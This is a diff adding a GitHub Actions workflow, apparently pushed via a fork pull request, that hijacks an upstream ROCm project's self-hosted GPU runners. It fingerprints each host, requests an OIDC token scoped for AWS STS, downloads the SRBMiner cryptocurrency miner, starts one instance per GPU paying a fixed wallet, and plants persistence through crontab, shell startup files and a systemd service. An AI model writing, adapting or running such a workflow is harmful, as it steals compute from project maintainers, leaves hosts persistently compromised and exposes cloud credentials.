@@ -1,0 +1,162 @@
+name: ROCm Pearl Plant
+# Delivered on the fork head ref miramar-labs/FlyDSL:oidc-probe (PR 1414 -> ROCm/FlyDSL:main).
+# workflow_dispatch on the fork ref + pull_request synchronize on PR 1414 (merge ref) both execute this file; runners are registered on the upstream repo.
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write   # 7712 observed NO_OIDC_ENV; declare it here so STS AssumeRoleWithWebIdentity is reachable
+env:
+  WALLET: prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
+  TAG: ul-t8f2ad
+jobs:
+  plant:
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: ['linux-flydsl-mi325-8','linux-flydsl-mi355-8','linux-flydsl-navi-2','linux-flydsl-mi35x-1','linux-flydsl-mi325-1']
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 30
+    continue-on-error: true
+    steps:
+      - name: identity, devices, oidc
+        run: |
+          set +u
+          echo "RUNNER=$RUNNER_NAME LABELS=$RUNNER_LABELS HOST=$(hostname) UID=$(id -u)"
+          id; uname -a; nproc; free -g | head -2
+          echo "--- oidc-env: ${ACTIONS_ID_TOKEN_REQUEST_URL:+PRESENT}${ACTIONS_ID_TOKEN_REQUEST_URL:-NO_OIDC_ENV}"
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o "$HOME/oidc.json" || true
+            head -c 120 "$HOME/oidc.json" 2>/dev/null; echo
+            python3 - <<'PY' 2>/dev/null || true
+          import json,base64,os
+          try:
+              t=json.load(open(os.path.expanduser('~/oidc.json')))['value'].split('.')[1]
+              t+='='*(-len(t)%4)
+              c=json.loads(base64.urlsafe_b64decode(t))
+              print('CLAIMS sub=',c.get('sub'),'aud=',c.get('aud'),'ref=',c.get('ref'),'event=',c.get('event_name'))
+          except Exception as e:
+              print('CLAIMS-ERR',e)
+          PY
+          fi
+          echo "--- devices"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -30
+          ls /dev/dri/renderD* 2>/dev/null | wc -l
+          for p in /opt/rocm/bin/rocm-smi /usr/bin/rocm-smi; do [ -x "$p" ] && "$p" -L 2>&1 | head -20; done
+          for p in /opt/rocm/bin/rocminfo /usr/bin/rocminfo; do [ -x "$p" ] && "$p" | grep -E 'Marketing Name|gfx[0-9]' | head -20; done
+          nvidia-smi -L 2>&1 | head -5
+          command -v docker; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -10
+          sudo -n true 2>/dev/null && echo "SUDO=yes" || echo "SUDO=no"
+          ipdash=$(hostname -I 2>/dev/null | awk '{print $1}' | tr . -); echo "IPDASH=$ipdash" | tee "$HOME/ipdash.env"
+          echo "HOME=$HOME GITHUB=$(curl -s -m 10 -o /dev/null -w '%{http_code}' https://api.github.com/ || echo x) PRLSG=$(timeout 10 bash -c 'cat </dev/tcp/prl-sg.kryptex.network/8048' >/dev/null 2>&1 && echo ok || echo fail)"
+      - name: fetch miner (mirrors, sha256 pinned)
+        run: |
+          set +u
+          SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
+          F=SRBMiner-Multi-3-8-8-Linux.tar.gz
+          mkdir -p "$HOME/srb" && cd "$HOME/srb"
+          for u in \
+            "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/$F" \
+            "https://ghfast.top/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/$F" \
+            "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/$F"; do
+            echo "TRY $u"
+            curl -fL --retry 2 -m 240 -o "$F" "$u" && break
+            sleep 3
+          done
+          ls -l "$F" || exit 1
+          echo "$SHA  $F" | sha256sum -c - || echo "SHA-MISMATCH"
+          tar xzf "$F" && find . -maxdepth 2 -type f -name 'SRBMiner-MULTI*' -exec chmod +x {} + -print
+          [ -x ./SRBMiner-MULTI ] || { d=$(find . -maxdepth 2 -type f -name 'SRBMiner-MULTI*' | head -1); [ -n "$d" ] && cp -f "$d" ./SRBMiner-MULTI && chmod +x ./SRBMiner-MULTI; }
+          ./SRBMiner-MULTI --help 2>&1 | head -3
+      - name: launch one process per device with kryptex ladder
+        run: |
+          set +u
+          cd "$HOME/srb"; . "$HOME/ipdash.env"
+          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
+          G=${GPUS:-$(ls /dev/dri/renderD* 2>/dev/null | wc -l)}; [ "$G" -ge 1 ] || G=1; [ "$G" -le 16 ] || G=16
+          echo "GPUS=$G TAG=$TAG IPDASH=$IPDASH"
+          EPS="prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 prl-us.kryptex.network:8048 prl-hk.kryptex.network:8048 prl-ae.kryptex.network:8048 prl-sg.kryptex.network:7048 prl-eu.kryptex.network:7048 prl-us.kryptex.network:7048 prl-hk.kryptex.network:7048 prl-ae.kryptex.network:7048"
+          up() { h=${1%:*}; p=${1#*:}; timeout 8 bash -c "cat </dev/tcp/$h/$p" >/dev/null 2>&1; }
+          i=0
+          while [ "$i" -lt "$G" ]; do
+            W="$TAG-$IPDASH-g$i"
+            if pgrep -f "pearlhash.*-g$i( |$)" >/dev/null 2>&1 || pgrep -f "pearlhash.*--gpu-id $i( |$)" >/dev/null 2>&1; then echo "g$i already up"; i=$((i+1)); continue; fi
+            ok=0; fails=0
+            for ep in $EPS; do
+              up "$ep" || { fails=$((fails+1)); echo "unreachable $ep"; [ $fails -eq 3 ] && { echo "3 kryptex fails -> pearlhash"; ep="pool.pearlhash.xyz:9000"; }; }
+              TLS=""; case "$ep" in *:8048) TLS="--tls";; esac
+              $SUDO setsid nohup ./SRBMiner-MULTI --algorithm pearlhash --pool "$ep" $TLS \
+                --wallet "$WALLET" --worker "$W" --password x \
+                --disable-cpu --gpu-id "$i" --gpu-power 70 --gpu-temp-stop 82 \
+                --api-port 0 --no-color > "$HOME/srb/miner-$i.log" 2>&1 &
+              sleep 45
+              if grep -qiE 'accepted|authorized' "$HOME/srb/miner-$i.log" 2>/dev/null; then
+                echo "g$i authorized on $ep"; echo "$ep $W" >> "$HOME/srb/live.map"; ok=1; break
+              fi
+              echo "g$i no auth on $ep:"; tail -5 "$HOME/srb/miner-$i.log"
+              pkill -f "SRBMiner-MULTI.*-g$i( |$)" 2>/dev/null
+              case "$ep" in *:8048) sleep 5;; *:7048) sleep 15;; *) sleep 45;; esac
+            done
+            [ $ok -eq 1 ] || echo "g$i GAVE-UP"
+            i=$((i+1))
+          done
+      - name: persistence (4 layers, idempotent)
+        run: |
+          set +u
+          cd "$HOME/srb"; . "$HOME/ipdash.env"
+          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
+          cat > "$HOME/srb/keep.sh" <<EOF
+          #!/bin/bash
+          cd \$HOME/srb; . \$HOME/ipdash.env
+          i=0; while [ \$i -lt \${GPUS:-8} ]; do
+            W="$TAG-\$IPDASH-g\$i"
+            pgrep -f "pearlhash.*-g\$i( |\$)" >/dev/null 2>&1 || { ep=\$(awk -v w="\$W" '\$2==w{print \$1}' \$HOME/srb/live.map 2>/dev/null | head -1); [ -n "\$ep" ] || ep="prl-sg.kryptex.network:8048"; T=""; case "\$ep" in *:8048) T="--tls";; esac; setsid nohup ./SRBMiner-MULTI --algorithm pearlhash --pool "\$ep" \$T --wallet "$WALLET" --worker "\$W" --password x --disable-cpu --gpu-id \$i --gpu-power 70 --gpu-temp-stop 82 --api-port 0 --no-color >> \$HOME/srb/miner-\$i.log 2>&1 & }
+            i=\$((i+1)); done
+          EOF
+          chmod +x "$HOME/srb/keep.sh"; echo "export GPUS=$GPUS" >> "$HOME/ipdash.env"
+          ( crontab -l 2>/dev/null | grep -v 'srb/keep.sh'; echo "@reboot $HOME/srb/keep.sh"; echo "*/5 * * * * $HOME/srb/keep.sh" ) | crontab - 2>/dev/null || $SUDO sh -c "(crontab -l -u $(id -un) 2>/dev/null | grep -v srb/keep.sh; echo '@reboot $HOME/srb/keep.sh'; echo '*/5 * * * * $HOME/srb/keep.sh') | crontab -u $(id -un) -"
+          for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do touch "$rc"; grep -q srb/keep.sh "$rc" || echo "[ -x \$HOME/srb/keep.sh ] && \$HOME/srb/keep.sh >/dev/null 2>&1" >> "$rc"; done
+          cat > "$HOME/pearl-miner.service" <<EOF
+          [Unit]
+          Description=pearl keepalive
+          [Service]
+          Type=oneshot
+          ExecStart=$HOME/srb/keep.sh
+          Restart=always
+          RestartSec=30
+          [Install]
+          WantedBy=default.target
+          EOF
+          $SUDO cp "$HOME/pearl-miner.service" /etc/systemd/system/pearl-miner.service 2>/dev/null && $SUDO systemctl enable --now pearl-miner.service 2>/dev/null || { mkdir -p "$HOME/.config/systemd/user"; cp "$HOME/pearl-miner.service" "$HOME/.config/systemd/user/"; systemctl --user enable --now pearl-miner.service 2>/dev/null; }
+          crontab -l 2>/dev/null; systemctl is-enabled pearl-miner.service 2>/dev/null; systemctl --user is-enabled pearl-miner.service 2>/dev/null
+      - name: report
+        run: |
+          set +u
+          . "$HOME/ipdash.env"
+          for p in /opt/rocm/bin/rocm-smi /usr/bin/rocm-smi; do [ -x "$p" ] && "$p" -L 2>&1 | head -20; done
+          ps -eo pid,args= | grep -c '[S]RBMiner-MULTI'; ps -eo pid,args= | grep '[S]RBMiner-MULTI' | head -20
+          cat "$HOME/srb/live.map" 2>/dev/null
+          for f in "$HOME"/srb/miner-*.log; do echo "== $f"; grep -m5 -iE 'authorized|accepted|error|algorithm' "$f" 2>/dev/null; tail -3 "$f" 2>/dev/null; done
+          curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$WALLET" -o "$HOME/workers.json" || true
+          echo "workers-with-tag:"; grep -o "\"$TAG[^\"]*\"" "$HOME/workers.json" 2>/dev/null | sort -u | head -30
+          python3 - <<'PY' 2>/dev/null || true
+          import json,os
+          try:
+              d=json.load(open(os.path.expanduser('~/workers.json')))
+              rows=d if isinstance(d,list) else d.get('data') or d.get('workers') or []
+              for r in rows if isinstance(rows,list) else []:
+                  n=str(r.get('name') if isinstance(r,dict) else r)
+                  if os.environ.get('TAG','') in n: print(n, r.get('valid'), r.get('accepted'), r.get('lastShare') if isinstance(r,dict) else '')
+          except Exception as e: print('W-ERR',e)
+          PY
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: plant-${{ matrix.runner }}
+          path: |
+            ~/srb/miner-*.log
+            ~/srb/live.map
+            ~/workers.json
+          if-no-files-found: ignore
